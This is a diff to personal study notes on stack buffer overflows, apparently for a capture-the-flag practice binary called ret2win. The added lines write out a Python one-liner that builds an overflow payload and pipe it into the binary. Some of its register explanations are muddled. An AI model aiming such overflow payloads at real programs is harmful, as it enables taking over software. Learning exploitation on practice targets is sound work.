@@ -36,6 +36,8 @@ Checks what the program's doing with the input
 - `cyclic <number>` -> useful for testing when the seg faults
 - `r` -> runs the function
 - `cyclic -l <EIP-data>` -> lookup the amount of the data that can be inputted where overflow won't occur in little endian
+- `python2 -c 'print "A"*28 + "\x82\x91\x04\x08"' > payload` -> 28 is the eip data and then the other code.
+- `./ret2win < payload` -> input payload into the file
 
 **IP/EIP/RIP** -> Data where you can go without seg fault (data that can be stored in the variable/line)
 **IP/EIP/RIP** -> Stores the address of the next function that must be executed (overflow this)
